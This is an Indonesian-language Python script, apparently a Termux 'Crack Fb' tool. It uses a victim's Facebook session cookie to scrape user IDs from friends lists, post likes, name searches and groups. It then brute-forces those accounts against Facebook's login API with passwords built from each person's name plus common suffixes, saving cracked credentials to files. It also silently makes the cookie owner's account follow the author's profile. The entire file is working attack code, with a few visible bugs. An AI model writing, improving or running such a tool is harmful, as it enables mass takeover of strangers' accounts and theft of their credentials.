#!/usr/bin/env python3

# -*- coding: utf-8 -*-

# coded by Tegar ID

# Developer Dunia Kode

# open source

import os,sys,re,json,random,requests

from bs4 import BeautifulSoup as parser

from concurrent.futures import ThreadPoolExecutor

from time import sleep

def clear():

    os.system("clear")

def kata(s):

    for c in s + '\n':

        sys.stdout.write(c)

        sys.stdout.flush()

        sleep(1./300)

def baner():

    sleep(0.1)
    
    print ('\033[37;1m')
    print (' \033[41;1m                     \033[00m  [ \033[44;1mSAD TOOLS\033[00m ]')
    print (' \033[41;1m                     \033[00m  [ \033[41;1mDunia Kode\033[00m ]')
    print (' \033[47;1m                     \033[00m  [ \033[44;1mCoder Cyber Mafia\033[00m ]')
    print (' \033[47;1m                     \033[00m              [ \033[41;1mV 0.1\033[00m ]\033[34;1m')
    print ('█████████████████████████████████████████████')
    print ('█─▄▄▄─█▄─▄▄▀██▀▄─██─▄▄▄─█▄─█─▄███▄─▄▄─█▄─▄─▀█')
    print ('█─███▀██─▄─▄██─▀─██─███▀██─▄▀█████─▄████─▄─▀█')
    print ('█▄▄▄▄▄█▄▄█▄▄█▄▄█▄▄█▄▄▄▄▄█▄▄█▄▄███▄▄▄███▄▄▄▄██')
    print ('    ')
def balik():

    f=input("\t[\033[41;1mTekan Enter Untuk Kembali\033[00;1m]")

    if f == "":

       ols.system("python crack.py")

    else:

       sys.exit("\033[31;1mKeluar")

def mbf():

    sleep(0.1)

    print("\033[34;1m[\033[31;1m•\033[34;1m] \033[47;1mMenu Crack Fb\033[00m")

    print("\033[34;1m[\033[31;1m1\033[34;1m] \033[37;1mStart Crack")

    print("\033[34;1m[\033[31;1m2\033[34;1m] \033[37;1mCara Dapat Cookies")

    print("\033[34;1m[\033[31;1m3\033[34;1m] \033[37;1mUpdate")

    print("\033[34;1m[\033[36;1m0\033[34;1m] \033[37;1mExit")

    sleep(0.1)

    f=input("\n\033[36;1m @pilih >> \033[37;1m")

    if f == "1":

         mbasic = 'https://mbasic.facebook.com{}'

         global die,check,result, count

         id = []

         die = 0

         chek = []

         hack = []

         count = 0

         check = 0

         result = 0

         def masuk():

             try:

                    cek = open("cookies").read()

             except FileNotFoundError:

                    cek = input("\033[37;1m[\033[41;1mMasukan Cookies\033[00;1m\033[37;1m] \033[36;1m: \033[37;1m")

             cek = {"cookie":cek}

             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content

             if "mbasic_logout_button" in str(ismi):

                     if "Apa yang Anda pikirkan sekarang" in str(ismi):

                             with open("cookies","w") as f:

                                     f.write(cek["cookie"])

                     else:

                           print("\033[31;1mUbah bahasa, harap tunggu\033[37;1m!!")

                           try:

                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)

                           except:

                                  pass

                     try:

                             ikuti = parser(requests.get(mbasic.format("/xzcoder.xzcoder"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]

                             ses.get(mbasic.format(ikuti),cookies=cek)

                     except :

                             pass

                     return cek["cookie"]

             else:

                  exit("\033[37;1m[\033[41;1mCookies Salah!!\033[00;1m\033[37;1m]")

         def login(username,password,cek=False):

             global die,check,result,count

             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"

             params = {

                     'access_token': b,

                     'format': 'JSON',

                     'sdk_version': '2',

                     'email': username,

                     'locale': 'en_US',

                     'password': password,

                     'sdk': 'ios',

                     'generate_session_cookies': '1',

                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',

             }

             api = 'https://b-api.facebook.com/method/auth.login'

             response = requests.get(api, params=params)

             if 'EAA' in response.text:

                 print(f"\r\033[00m[\033[1;32m✓\033[00m] \033[1;32m{username} \033[90m─> \033[1;32m{password}                       ",end="")

                 print()

                 result += 1

                 if cek:

                        life.append(username+"|"+password)

                 else:

                        with open('results-life.txt','a') as f:

                                f.write(username + '|' + password + '\n')

             elif 'www.facebook.com' in response.json()['error_msg']:

                   print(f"\r\033[00m[\033[1;91mx\033[00m] \033[1;33m{username} \033[90m─> \033[1;33m{password}                    ",end="")

                   print()

                   check += 1

                   if cek:

                           chek.append(username+"|"+password)

                   else:

                           with open('results-check.txt','a') as f:

                                f.write(username + '|' + password + '\n')

             else:

                   die += 1

             for i in list('\|/-•'):

                            print(f"\r\033[00m[\033[1;91m{i}\033[00m] hacked : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;91m{str(die)}\033[90m)\033[00m",end="")

                            sleep(0.2)

         def getid(url):

             raw = requests.get(url,cookies=kuki).content

             getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))

             for x in getuser:

                 if 'profile' in x[0]:

                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])

                 elif 'friends' in x:

                        continue

                 else:

                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])

                 print('\r\033[90m> \033[1;96m' + str(len(id)) + " \033[00msedang mengambil ID",end="")

             if 'Lihat Teman Lain' in str(raw):

                 getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))

             return id

         def fromlikes(url):

             try:

                  like = requests.get(url,cookies=kuki).content

                  love = re.findall('href="(/ufi.*?)"',str(like))[0]

                  aws = getlike(mbasic.format(love))

                  return aws

             except:

                  exit("\033[90m> \033[1;91mcant dump id\033[00m ")

         def getlike(react):

             like = requests.get(react,cookies=kuki).content

             ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))

             for user in ids:

                 if 'profile' in user[0]:

                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])

                 else:

                         id.append(user[1] + "|" + user[0].split('/')[1])

                 print(f'\r\033[90m \033[1;96m{str(len(id))} \033[00msedang mengambil ID',end="")

             if 'Lihat Selengkapnya' in str(like):

                 getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))

             return id

         def bysearch(option):

             search = requests.get(option,cookies=kuki).content

             users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))

             for user in users:

                  if "profile" in user[0]:

                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])

                  else:

                         id.append(user[1] + "|" + user[0].split("?")[0])

                  print(f"\r\033[90m> \033[1;96m{str(len(id))} \033[00msedang mengambil ID ",end="")

             if "Lihat Hasil Selanjutnya" in str(search):

                  bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])

             return id

         def grubid(endpoint):

             grab = requests.get(endpoint,cookies=kuki).content

             users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))

             for user in users:

                 if "profile" in user[0]:

                         id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])

                 else:

                         id.append(user[1] + "|" + user[0])

                 print(f"\r\033[90m> \033[1;96m{str(len(id))} \033[00msedang mengambil ID ",end="")

             if "Lihat Selengkapnya" in str(grab):

                 grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))

             return id

         if __name__ == '__main__':

               try:

                   ses = requests.Session()

                   kukis = masuk()

                   kuki = {'cookie':kukis}

                   clear()

                   baner()

                   kata('\033[34;1m{\033[31;1m1\033[34;1m} Crack Dari Teman')

                   kata('\033[34;1m{\033[31;1m2\033[34;1m} Crack Dari Link Post\033[1;97m ')

                   kata('\033[34;1m{\033[31;1m3\033[34;1m} Crack Dari Pencarian Nama')

                   kata('\033[34;1m{\033[31;1m4\033[34;1m} Crack Dari Grup ')

                   kata('\033[34;1m{\033[31;1m5\033[34;1m} Crack Dari Teman Publik')

                   kata('\033[34;1m{\033[36;1m6\033[34;1m} Lihat Hasil Crack')

                   print()

                   tanya = input('\n\033[36;1m>> \033[37;1m ')

                   if tanya =="":

                         exit("\033[37;1m[\033[41;1mDi isi tod bukan diliatin\033[00;1m\033[37;1m]")

                   elif tanya == '1':

                         url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')

                         username = getid(mbasic.format(url["href"]))

                   elif tanya == '2':

                         username = input("\033[37;1m[\033[41;1mLink Post\033[00;1m\033[36;1m] : \033[37;1m")

                         if username == "":

                                 exit("\033[31;1m Di isi tod")

                         elif 'www.facebook' in username:

                                 username = username.replace('www.facebook','mbasic.facebook')

                         elif 'm.facebook.com' in username:

                                 username = username.replace('m.facebook.com','mbasic.facebook.com')

                         username = fromlikes(username)

                   elif tanya == '3':

                         knf = input("\033[37;1m[\033[41;1mpertanyaan\033[00;1m\033[36;1m] \033[36;1m: \033[37;1m")

                         username = bysearch(mbasic.format('/search/people/?q='+knf))

                         if len(username) == 0:

                                 exit("\033[90m[\033[91m!\033[00m] tidak ada")

                   elif tanya == '4':

                         print("\033[90m> \033[00mhanya bisa mengambil \033[91m100 \033[00mID ")

                         grab = input("\033[37;1m[\033[41;1mID group\033[00;1m\033[37;1m] \033[36;1m: \033[37;1m")

                         username = grubid(mbasic.format("/browse/group/members/?id=" + grab))

                         if len(username) == 0:

                                 exit("\033[00m[\033[91m!\033[00m]ID Tidak ada")

                   elif tanya == '5':

                         knf = input("\033[37;1n[\033[41;1mUsername/Id\033[00;1m\033[37;1m] \033[36;1m: \033[37;1m")

                         if knf.isdigit():

                                 user = "/profile.php?id=" + knf

                         else:

                                 user = "/" + knf

                         try:

                                 user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]

                                 username = getid(mbasic.format(user))

                         except TypeError:

                                 exit("\033[00m[\033[91m!\033[00m] User Tidak ada ")

                   elif tanya == '6':

                         try:

                                 file1 = open("results-check.txt").read()

                                 file2 = open("results-hack.txt").read()

                                 a = file1 + file2

                                 final = a.strip().split("\n")

                                 final = set(final)

                                 print(f"\033[00m [\033[1;93m{str(len(final))}\033[00m] akun untuk diperiksa ")

                                 with ThreadPoolExecutor(max_workers=10) as ex:

                                         for user in final:

                                                 a = user.split("|")

                                                 ex.submit(login,(a[0]),(a[1]),(True))

                                 os.remove("results-check.txt")

                                 os.remove("results-life.txt")

                                 for x in life:

                                         with open('results-hack.txt','a') as f:

                                                 f.write(x+'\n')

                                 for x in chek:

                                         with open('results-check.txt','a') as f:

                                                 f.write(x+"\n")

                                 print("\n\033[00m[\033[92m✓\033[00m] Selesai")

                                 print("\033[90m> \033[00msaved to \033[1;93mresults-check.txt\033[90m|\033[1;92mresults-hack.txt")

                         except FileNotFoundError:

                                 exit("\033[31;1m tidak mendapatkan hasil")

                   else:

                         exit("\033[00m[\033[91m!\033[00m] nomor salah")

                   print()

                   expass = input("\033[37;1m[\033[41;1mPassword Tambahan\033[00;1m\033[37;1m] \033[36;1m: \033[37;1m")

                   with ThreadPoolExecutor(max_workers=30) as ex:

                          for user in username:

                                  users = user.split('|')

                                  ss = users[0].split(' ')

                                  for x in ss:

                                          listpass = [

                                                  str(x) + '123',

                                                  str(x) + '1234',

                                                  str(x) + '12345',

                                                  str(x) + '123456',

                                                  str(x) + 'Sayang',

                                                  str(x) + 'Sayang1', 

                                                  str(x) + 'Sayang12', 

                                                  str(x) + 'Sayang123', 
  
                                                  str(x) + 'Sayang1234',            

                                                  str(x) + 'Anjing',

                                                  str(x) + 'Bangsat',

                                                  str(x) + 'Freefire',

                                                  str(x) + 'Termux',

                                                  str(x) + 'Doraemon',

                                                  str(x) + 'Hellokitty', 

                                                  str(x) + 'Indonesia',

                                                  ]

                                          listpass.append(expass)

                                          for passw in set(listpass):

                                                  ex.submit(login,(users[1]),(passw))

                   if check != 0 or result != 0:

                           sleep(0.1)

                           print("\n\033[00m[\033[92m✓\033[00m] Selesai")

                           print("\033[00m[\033[92m✓\033[00m]hacked : \033[92mresults-hack.txt\033[00m")

                           print("\033[00m[\033[91m!\033[00m]checkpoint : \033[93mresults-check.txt\033[00m")

                           print("\n\n")

                   else:

                           sleep(0.1)

                           print("\n\033[00m[\033[92m✓\033[00m] Selesai")

                           print("\033[00m[\033[91m!\033[00m] Tidak ada hasil")

               except (KeyboardInterrupt,EOFError):

                       exit()

               except requests.exceptions.ConnectionError:

                       exit("\033[31;1m Tidak ada koneksi")

    elif f == "2":

         os.system("xdg-open https://duniaakode.blogspot.com/2020/11/cara-mendapatkan-cookies-facebook.html?m=1")

         balik()

    elif f == "3":

         os.system("git pull")

         balik()

    elif f == "0":

         sys.exit("\033[31;1mGood Bye\033[37;1m")

         exit()

if __name__=="__main__":

     clear()

     baner()

     mbf()

     balik()
